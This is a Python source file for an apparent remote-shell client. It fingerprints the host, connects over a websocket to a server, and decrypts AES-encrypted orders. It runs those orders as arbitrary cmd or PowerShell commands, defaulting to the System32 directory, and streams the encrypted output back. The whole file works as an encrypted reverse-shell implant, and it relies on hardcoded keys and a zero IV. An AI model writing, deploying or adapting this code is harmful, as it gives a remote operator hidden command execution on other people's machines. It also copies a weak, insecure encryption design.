from tiny_aes import AES, pad, unpad
from platform_xmrt import xmplatform
import websockets
import json
import asyncio
import subprocess

system_info = xmplatform()
tyaes = AES()

URL = "ws://localhost:8000/api/server/shell"
COMMAND_SEMAPHORE = asyncio.Semaphore(10)
IV = b'\x00' * 16
HEADER = {
    "FRS": f"From {system_info.get('system')}{system_info.get('release')} {system_info.get('version')} On {system_info.get('machine')}",
    "FRSNode": system_info.get('node')
}
AES_KEY = [
    b'O\xca\xfd\x1f[\xaa=\x1a\xa4\x80\xc4}$q[p',
    b'\x92Z7\x11\x81m\xac5r[k\x13)\xf1V\t',
    b'\x8dq\x92t\xa9\x00\xc9\x04;Z\xfe\x15\xba7R ',
    b'\xea[\xdc\xe7\xc3\xaa\x8a\xeeN\xdb\x18\x9a\xe7\xdb\xd1\x9e',
    b'\xdc\x81/\x8bf\xb6}\xab\xa0\xa4\xbe\xd4c\x0e4:',
    b'-\xd5,\xa0\xca\x0e\xfd>\x16\x8f\xd2\xb5p9\xaf\x1e',
    b'\xba\xdd\xcc\x85\xd9\xd3\xf8\xbf\xf4\x06\xd4\x1f>\x08)!',
    b'(\x87\xfb\x94X\xbeT\x8a\x04\xfd\xb2\xef\xdd.JP',
    b')(\x9eO\x17 \xb7n?\xa7L\xfag\x19\x18p',
    b'\xf0P\xe3j-~\xa9:\x04V7u\x13v\x80\x1b',
    b',\xd1\xcc\xe1K\xc8\xd4\x91X\x18b\xd9uf\xcb\xe3',
    b'q0\xfc\x96bF|\x8dN\x97\xb0l\x05_d\xfd',
    b'\x17[6\xb2b=\xfdQ\x13\r\x01\xc7qK}J'
]


def get_message(message_hex):
    ciphertext_bytes = bytes.fromhex(message_hex)
    decrypted = tyaes.aes_decrypt_cbc(ciphertext_bytes, AES_KEY, IV)
    unpadded = unpad(decrypted)
    return unpadded.decode('utf-8')

async def send_message(ws, type: str, data: str, debug: str):
    message_json = {
        "type": type,
        "data": data,
        "debug": debug
    }
    plaintext_bytes = json.dumps(message_json).encode('utf-8')
    padded = pad(plaintext_bytes)
    ciphertext = tyaes.aes_encrypt_cbc(padded, AES_KEY, IV)
    await ws.send(ciphertext.hex())

async def run_command(ws, message_data, powershell=False):
    command = message_data.get("data")
    path = message_data.get("path", "C:\\Windows\\System32")
    if not command or not path:
        error_message = "Invalid command or path"
        print(error_message)
        await send_message(ws, type="return_sys", data="$$$error$$$", debug=error_message)
        await send_message(ws, type="return_sys", data="$$$end$$$", debug="")
        return
    await send_message(ws, type="return", data="$$$start$$$", debug="")
    try:
        if powershell:
            full_command = f"powershell.exe -Command {command}"
        else:
            full_command = command

        process = await asyncio.create_subprocess_shell(
            full_command,
            cwd=path,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=False,
            bufsize=0
        )
        async def read_stream(stream, type):
            try:
                while True:
                    output = await stream.readline()
                    if output == b'':
                        break
                    output_str = output.decode('gbk', errors='replace').rstrip()
                    await send_message(ws, type=type, data=output_str, debug="cmdshell")
            except asyncio.CancelledError:
                pass
        try:
            await asyncio.wait_for(
                asyncio.gather(
                    read_stream(process.stdout, "return"),
                    read_stream(process.stderr, "return")
                ),
                timeout=300
            )
        except asyncio.TimeoutError:
            print("Command execution timed out")
            process.terminate()
            await process.wait()
        await send_message(ws, type="return_sys", data="$$$end$$$", debug="")
    except Exception as e:
        error_message = str(e)
        print(error_message)
        await send_message(ws, type="return_sys", data="$$$error$$$", debug=error_message)
        await send_message(ws, type="return", data="$$$end$$$", debug="")

async def handle_message(ws, message):
    try:
        decrypted_message = get_message(message)
        message_data = json.loads(decrypted_message)
        
        async def process_command():
            async with COMMAND_SEMAPHORE:
                if message_data.get("type") == "cmdshell":
                    await run_command(ws, message_data, False)
                elif message_data.get("type") == "powershell":
                    await run_command(ws, message_data, True)
                else:
                    pass
        asyncio.create_task(process_command())
    except Exception as e:
        print("Failed to decrypt message:", str(e))

async def input_handler(ws):
    loop = asyncio.get_event_loop()
    while True:
        msg = await loop.run_in_executor(None, input)
        await send_message(ws, type="chat", data=msg, debug="")

async def client():
    async with websockets.connect(URL, extra_headers=HEADER) as ws:
        await send_message(ws, type="init", data="Client initialized", debug="")
        asyncio.create_task(input_handler(ws))
        async for message in ws:
            await handle_message(ws, message)

if __name__ == "__main__":
    asyncio.run(client())